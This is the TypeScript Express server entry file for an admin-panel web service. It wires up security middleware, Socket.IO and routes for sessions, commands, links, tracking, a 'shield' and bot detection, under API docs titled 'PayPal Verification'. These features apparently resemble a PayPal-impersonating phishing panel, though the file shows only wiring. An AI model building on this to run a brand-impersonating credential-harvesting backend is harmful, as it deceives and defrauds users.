
import 'dotenv/config';
import express from 'express';
import { createServer } from 'http';
import cookieParser from 'cookie-parser';
import compression from 'compression';
import helmet from 'helmet';
import cors from 'cors';

// Middleware & Utils
import {
    generalRateLimit,
    cspMiddleware,
    securityHeaders,
    requestLogger,
    botDetection,
    validateSession,
    sanitizeMiddleware
} from './middleware/security';
import { setCsrfToken } from './middleware/csrf';
import logger from './utils/logger';
import { initSocket, getSocketIO } from './socket';
import { refreshSettings } from './utils/settings-cache';
import { initDB } from './db';
import { initRedis } from './services/redis.service';
import swaggerUi from 'swagger-ui-express';
import { swaggerSpec } from './swagger';

// Routes
import authRoutes from './routes/auth.routes';
import adminRoutes from './routes/admin.routes'; // Protected Admin API
import usersRoutes from './routes/users.routes';
import syncRoutes from './routes/sync.routes';
import settingsRoutes from './routes/settings.routes';
import trackRoutes from './routes/track.routes';
import shieldRoutes from './routes/shield.routes';
import systemRoutes from './routes/system.routes';

export const app = express();
const httpServer = createServer(app);

// 1. Core Middleware
app.use(compression());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(cors({
    origin: process.env['CORS_ORIGIN'] || true,
    credentials: true
}));

// 2. Security Middleware
app.use(helmet({ contentSecurityPolicy: false })); // CSP handled separately
app.use(cspMiddleware);
app.use(securityHeaders);
app.use(requestLogger);
app.use(botDetection);
app.use(sanitizeMiddleware);
app.use(generalRateLimit);
app.use(setCsrfToken); // Set CSRF cookies for SPA

// 3. Initialize Database & Socket.IO
initDB().then(() => {
    console.log('[Server] Database initialized');
    refreshSettings();
}).catch(err => {
    console.error('[Server] Database initialization failed:', err);
    process.exit(1);
});
initSocket(httpServer, { origin: process.env['CORS_ORIGIN'] || true, credentials: true });

// 4. Routes
app.use('/api/admin', authRoutes); // Public/Auth (Login, Me, Gate, CSRF, MFA)
app.use('/api/admin', adminRoutes); // Protected (Sessions, Commands, Links)
app.use('/api/admin/users', usersRoutes); // User Management (Hypervisor)
app.use('/api/admin/system', systemRoutes); // System health, audit, payments
app.use('/api', syncRoutes); // Mounts path '/sync' on '/api' -> /api/sync
app.use('/api/settings', settingsRoutes);
app.use('/api/track', trackRoutes);
app.use('/api/shield', shieldRoutes);

// API Documentation (Swagger UI)
app.use('/api/docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec, {
    customCss: '.swagger-ui .topbar { display: none }',
    customSiteTitle: 'PayPal Verification API Docs'
}));

// Health Check
app.get('/api/health', (req, res) => res.json({ status: 'ok', uptime: process.uptime() }));

// 5. Error Handling (must be AFTER routes)
import { errorHandler, notFoundHandler, setupGlobalErrorHandlers } from './middleware/error-handler';
app.use(notFoundHandler);
app.use(errorHandler);
setupGlobalErrorHandlers();

// Serve Static Frontend (Production)
if (process.env['NODE_ENV'] === 'production') {
    app.use(express.static('static'));

    // SPA Fallback
    app.get('*', (req, res) => {
        if (req.path.startsWith('/api')) return res.status(404).json({ error: 'Not Found' });
        res.sendFile('index.html', { root: 'static' });
    });
}

const PORT = process.env['PORT'] || 8080;

if (require.main === module) {
    httpServer.listen(PORT, () => {
        console.log(`[Server] Running on port ${PORT}`);
    });
}
